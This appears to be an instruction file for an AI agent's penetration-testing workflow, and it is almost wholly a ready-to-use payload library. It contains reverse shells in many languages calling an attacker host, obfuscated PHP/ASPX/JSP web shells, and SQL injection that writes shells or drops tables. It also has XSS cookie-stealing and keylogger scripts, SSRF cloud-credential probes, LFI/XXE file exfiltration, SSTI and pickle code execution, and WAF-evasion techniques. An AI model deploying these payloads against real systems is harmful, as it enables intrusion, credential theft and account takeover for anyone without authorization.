---
description: "Complete payload library for all vuln classes: reverse shells, web shells, SQLi, XSS, SSRF, LFI, XXE, SSTI, deserialization, WAF bypass, shell stabilization. Use when building or adapting payloads for confirmed vulnerabilities."
---

# SKILL — payload-craft

## Purpose
Generate, adapt, encode, and stage complete working payloads for confirmed vulnerabilities. Covers every major vuln class, every common platform, WAF bypass techniques, encoding chains, and post-delivery stabilization. Every payload is complete and ready to use — never a skeleton.

## When to load
- A vulnerability is confirmed and needs a working payload
- Need to bypass WAF, encoding, or filter restrictions
- Crafting reverse shells, web shells, bind shells, or stagers
- Adapting a public PoC to the specific target environment
- Need injection, serialization, SSTI, XXE, or template payloads
- Need to encode, obfuscate, or transform an existing payload

---

## Pre-payload checklist

Before crafting anything, confirm:
```
Target OS:          Linux / Windows / macOS
Available binaries: bash / sh / python / python3 / perl / ruby / nc / curl / wget
Outbound allowed:   yes / no / port-specific
Inbound port open:  <LPORT> (check if fw allows inbound)
Context:            web shell / RCE in app / deserialization / SSTI / etc.
Encoding needed:    URL / HTML / base64 / double-encoded / none
WAF present:        yes / no / unknown
Payload landing:    reflected / stored / executed server-side / client-side
```

---

## Listener setup (always first)

```bash
# Standard netcat listener
nc -lvnp <LPORT>

# Netcat with session logging
nc -lvnp <LPORT> | tee ~/loot/shell-$(date +%s).log

# Socat — stable PTY shell (best option)
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>,reuseaddr,fork

# Metasploit multi/handler
msfconsole -q -x "use multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; run"

# Python listener with logging
python3 -c "
import socket,threading,sys
s=socket.socket()
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('0.0.0.0',<LPORT>))
s.listen(1)
print('[+] Listening on <LPORT>')
c,a=s.accept()
print(f'[+] Connection from {a}')
import pty,os
os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2)
pty.spawn('/bin/bash')
"
```

---

## Reverse shells

### Bash
```bash
# Standard
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Alternative (avoids >& syntax issues)
exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do $line 2>&5 >&5; done

# With /bin/sh
sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1

# Encoded for web context
bash -c 'bash -i >%26 /dev/tcp/<LHOST>/<LPORT> 0>%261'

# Base64 encoded (avoids special char filtering)
echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1" | base64 -w0
# Use as: bash -c {echo,<B64>}|{base64,-d}|bash
```

### Python
```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python3 with pty (stable)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Python2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

# Windows Python
python -c "import socket,subprocess;s=socket.socket();s.connect(('<LHOST>',<LPORT>));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"
```

### PHP
```bash
# Exec
php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Proc_open
php -r '$sock=fsockopen("<LHOST>",<LPORT>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# Shell_exec
php -r '$s=fsockopen("<LHOST>",<LPORT>);while(!feof($s)){$c=fgets($s,1024);$o=shell_exec($c);fwrite($s,$o);}'

# URL-encoded for web parameter
php+-r+'$sock%3dfsockopen("<LHOST>",<LPORT>)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
```

### Perl
```bash
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat
```bash
# With -e flag
nc <LHOST> <LPORT> -e /bin/bash

# Without -e (mkfifo method)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f

# BusyBox nc
busybox nc <LHOST> <LPORT> -e sh
```

### Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<LHOST>:<LPORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \
  > /tmp/rev.go && go run /tmp/rev.go
```

### Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<LHOST>/<LPORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; print c; while ((c |& getline) > 0) print |& s; close(c); } while(c != "exit") close(s); }}' /dev/null
```

### PowerShell (Windows)
```powershell
# Standard
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (bypasses command line logging)
$cmd = 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient..."'
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
# Run as: powershell -enc <B64>

# Download and execute
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
```

---

## Web shells

### PHP
```php
# Minimal
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>
<?php passthru($_POST['cmd']); ?>

# With auth (MD5 password gate)
<?php if(md5($_GET['pass'])=='098f6bcd4621d373cade4e832627b4f6'){system($_GET['cmd']);} ?>
# MD5 of 'test' = 098f6bcd4621d373cade4e832627b4f6

# Feature-rich
<?php
$output = '';
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
}
echo '<pre>' . htmlspecialchars($output) . '</pre>';
?>

# Bypass disabled functions (proc_open)
<?php
$descriptorspec = array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
$process = proc_open($_GET['cmd'],$descriptorspec,$pipes);
echo stream_get_contents($pipes[1]);
?>

# Obfuscated (avoids simple string matching)
<?php $f='sys'.'tem'; $f($_POST['c']); ?>
<?php $_=base64_decode('c3lzdGVt'); $_($_GET['c']); ?>
```

### ASP / ASPX
```asp
<!-- Classic ASP -->
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>

<!-- ASPX -->
<%@ Page Language="C#" %>
<%
System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + Request.QueryString["cmd"];
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
System.Diagnostics.Process p = System.Diagnostics.Process.Start(psi);
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### JSP
```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process proc = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
String line;
while ((line = br.readLine()) != null) { out.println(line + "<br>"); }
%>
```

---

## SQL injection payloads

### MySQL
```sql
# Error-based
' AND extractvalue(1,concat(0x7e,(SELECT version()))) -- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1) -- -

# Union-based (find column count first)
' ORDER BY 1 -- -   (increment until error)
' UNION SELECT NULL -- -
' UNION SELECT NULL,NULL -- -
' UNION SELECT NULL,NULL,NULL -- -
# Extract data
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database() -- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' -- -
' UNION SELECT username,password FROM users -- -

# Blind boolean
' AND 1=1 -- -     (true — same response)
' AND 1=2 -- -     (false — different response)
' AND SUBSTRING(version(),1,1)='5' -- -

# Time-based blind
' AND SLEEP(5) -- -
' AND IF(1=1,SLEEP(5),0) -- -
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0) -- -

# File read (requires FILE privilege)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL -- -

# File write (requires FILE + write access)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php' -- -

# Stacked queries (if supported)
'; DROP TABLE users; -- -
'; INSERT INTO users VALUES ('hacker','hacked'); -- -
```

### MSSQL
```sql
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) -- -
'; EXEC xp_cmdshell('whoami') -- -
'; EXEC xp_cmdshell('powershell -enc <B64PAYLOAD>') -- -
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE -- -
```

### PostgreSQL
```sql
'; SELECT pg_sleep(5) -- -
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' -- -
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec -- -
```

### NoSQL (MongoDB)
```json
# Auth bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Injection in query parameter
?username[$ne]=invalid&password[$ne]=invalid
?username=admin&password[$regex]=.*
```

---

## XSS payloads

### Basic detection
```html
<script>alert(document.domain)</script>
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### Cookie theft
```html
<script>
fetch('http://<LHOST>/steal?c='+btoa(document.cookie))
</script>
<script>
new Image().src='http://<LHOST>/steal?c='+encodeURIComponent(document.cookie)
</script>
```

### Keylogger
```html
<script>
document.addEventListener('keypress',function(e){
  fetch('http://<LHOST>/keys?k='+e.key)
})
</script>
```

### Full session hijack (stored XSS -> admin account takeover)
```html
<script>
fetch('/api/user/profile',{credentials:'include'})
.then(r=>r.json())
.then(d=>fetch('http://<LHOST>/loot?data='+btoa(JSON.stringify(d))))
</script>
```

### CSP bypass techniques
```html
# Via JSONP endpoint
<script src="/api/jsonp?callback=alert(1)//"></script>
# Via Angular template injection (if Angular present)
{{constructor.constructor('alert(1)')()}}
# Via unsafe-inline with nonce leak
# Find nonce in source, reuse in injected script
<script nonce="LEAKED_NONCE">alert(1)</script>
# Via base-uri injection
<base href="http://<LHOST>/">
```

### Filter bypass variants
```html
# Mixed case
<ScRiPt>alert(1)</ScRiPt>
# No space
<img/src=x/onerror=alert(1)>
# JavaScript protocol
<a href="javascript:alert(1)">click</a>
# Event handlers
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<video onloadeddata=alert(1) src=x>
<details open ontoggle=alert(1)>
# Template literals
<script>alert`1`</script>
# Encoding
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

---

## SSRF payloads

### Basic probe
```
http://127.0.0.1/
http://localhost/
http://127.0.0.1:22/
http://127.0.0.1:3306/
http://127.0.0.1:6379/
http://127.0.0.1:27017/
http://127.0.0.1:9200/
http://127.0.0.1:2375/   (Docker API)
http://127.0.0.1:10250/  (Kubelet)
```

### Cloud metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://[fd00:ec2::254]/latest/meta-data/  (IPv6)

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# (requires header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# (requires header: Metadata: true)

# Digital Ocean
http://169.254.169.254/metadata/v1/
```

### Filter bypass
```
# IP encoding
http://2130706433/          (127.0.0.1 decimal)
http://0x7f000001/          (hex)
http://0177.0.0.1/          (octal)
http://127.1/               (short form)
http://[::1]/               (IPv6)
http://[::ffff:127.0.0.1]/

# DNS rebinding
http://<subdomain-that-resolves-to-127.0.0.1>/

# Protocol variants
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
file:///etc/passwd
ftp://127.0.0.1:21/

# URL confusion
http://evil.com@127.0.0.1/
http://127.0.0.1#evil.com
http://127.0.0.1?.evil.com
```

---

## LFI / Path traversal payloads

```bash
# Basic traversal
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd

# Encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd    (double URL encode)
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Mixed slashes
....//....//....//etc/passwd
..\/..\/..\/etc\/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)

# Null byte (old PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd\0
../../../etc/passwd%00.jpg

# PHP wrappers
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=convert.base64-encode/resource=/var/www/html/config.php
php://input    (POST body executed as PHP)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id    (if expect extension enabled)
zip://shell.jpg%23shell.php

# Interesting files to read
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/net/tcp
/var/log/apache2/access.log      (log poisoning)
/var/log/nginx/access.log
/var/log/auth.log
/var/www/html/config.php
/var/www/html/.env
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
```

### LFI to RCE via log poisoning
```bash
# Step 1: Poison Apache access log with PHP code
curl -A "<?php system(\$_GET['cmd']); ?>" http://<TARGET>/

# Step 2: Include the log file and execute
curl "http://<TARGET>/vuln.php?file=../../../../var/log/apache2/access.log&cmd=id"

# Alternatives for log poisoning:
# /var/log/nginx/access.log  — User-Agent header
# /var/log/mail.log          — via email to target
# /proc/self/environ         — via User-Agent header
# /var/log/vsftpd.log        — via FTP login username
```

---

## XXE payloads

```xml
<!-- Basic file read -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Blind XXE via OOB (out-of-band exfil) -->
<!-- Host this as evil.dtd at http://<LHOST>/evil.dtd: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://<LHOST>/?data=%file;'>">
%wrap;
%send;

<!-- Reference in request: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://<LHOST>/evil.dtd">
  %ext;
]>
<root></root>

<!-- XXE in SVG upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## SSTI payloads

### Detection polyglot
```
${{<%[%'"}}%\
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Jinja2 (Python / Flask)
```python
# Simple test
{{7*'7'}}       -> 7777777 (confirms Jinja2)

# Config dump
{{config}}
{{config.items()}}

# RCE — class traversal
{{''.__class__.__mro__[1].__subclasses__()}}
# Find index of subprocess.Popen:
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
# Alternative — os.popen
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
# With Werkzeug
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```php
{{7*7}}             -> 49
{{7*'7'}}           -> 49
{{dump(app)}}
{{app.request.server.all|join(',')}}
# RCE
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('passthru')}}
{{'id'|system}}
```

### Freemarker (Java)
```java
${7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB (Ruby)
```ruby
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
```

### Velocity (Java)
```java
#set($e="exp")
$e.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

---

## Deserialization payloads

### Java (ysoserial)
```bash
# List available gadget chains
java -jar ysoserial.jar 2>&1 | grep "^  " | awk '{print $1}'

# Generate payload for commons-collections (most common)
java -jar ysoserial.jar CommonsCollections1 'curl http://<LHOST>/rce' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,<B64_REVSHELL>}|{base64,-d}|bash' | base64 -w0

# Common gadget chains
CommonsCollections1, 2, 3, 4, 5, 6, 7
Spring1, Spring2
Hibernate1, Hibernate2
BeanShell1
ROME
JRMPClient (for RMI)
```

### PHP object injection
```php
# Find unserialize() calls in source
grep -r "unserialize" /var/www/html/ 2>/dev/null

# Build POP chain — example with __destruct
# Step 1: identify magic methods (__destruct, __wakeup, __toString, __call)
# Step 2: trace execution path to dangerous function (system, exec, file_put_contents)
# Step 3: craft object with properties that trigger the chain

# Basic test payload
O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}
```

### Python pickle
```python
import pickle, os, base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

---

## WAF bypass techniques

### Encoding chains
```
# URL encode
' -> %27
< -> %3C
> -> %3E
/ -> %2F

# Double URL encode
' -> %2527
< -> %253C

# HTML entity encode
< -> &lt; -> &#60; -> &#x3c;

# Unicode normalization
ＳＥＬＥＣＴvs SELECT   (fullwidth)
𝗦𝗘𝗟𝗘𝗖𝗧             (mathematical bold)

# Base64 in supported contexts
eval(atob('YWxlcnQoMSk='))
```

### SQL WAF bypass
```sql
# Comment injection
SE/**/LECT, UN/**/ION SEL/**/ECT
SE--comment%0aLECT

# Whitespace alternatives
SELECT%09FROM   (tab)
SELECT%0aFROM   (newline)
SELECT%0dFROM   (carriage return)
SELECT%0cFROM   (form feed)
SELECT/**/FROM

# Case variation
sElEcT, SeLeCt, UNION ALL SELECT

# Scientific notation (MySQL)
SELECT 1e0UNION SELECT   (no space needed)

# Parentheses
SELECT(1)FROM(users)

# Version comment (MySQL-specific)
/*!50000 UNION*/ SELECT

# AND/OR alternatives
&& instead of AND
|| instead of OR
```

### HTTP-level WAF bypass
```http
# IP spoofing headers (bypass IP-based rate limits)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# Content-Type confusion
Content-Type: application/json -> application/x-www-form-urlencoded
Content-Type: application/xml -> text/xml

# Parameter pollution (duplicate params)
?cmd=ls&cmd=whoami  (which one does the app use?)

# HTTP verb confusion
POST -> PUT, PATCH, OPTIONS

# Path confusion
/admin/../admin/secret
/api//endpoint
/API/endpoint  (case)
```

### XSS WAF bypass
```html
# No angle brackets needed
javascript:alert(1)
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

# Script tag alternatives
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<input/onmouseover="alert(1)">
<details/open/ontoggle="alert(1)">

# Encoding
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<script>eval(atob('YWxlcnQoMSk='))</script>
```

---

## Shell stabilization (post-delivery)

```bash
# After getting basic /bin/sh — stabilize immediately

# Method 1 — Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null || \
python -c 'import pty;pty.spawn("/bin/bash")' 2>/dev/null

# Background it: Ctrl+Z
# Then on attacker machine:
stty raw -echo; fg
# On shell:
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 cols 220

# Method 2 — socat upgrade
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:<LPORT2>
# Target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT2>

# Method 3 — script
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Check for sudo rights immediately
sudo -l 2>/dev/null
id && whoami && hostname && cat /etc/passwd | grep -v nologin | grep sh
```

---

## Rules
- Always confirm target OS and available binaries before crafting
- Stage payloads to workspace (`exploits/working/`) before use
- Document every payload variant tried and its result with evidence
- Record exact request/response for every attempt
- WAF bypass: try at least 5 encoding variants before concluding blocked
- Stabilize shell immediately after obtaining it — unstable shells lose access
- Never auto-execute payloads on target without operator order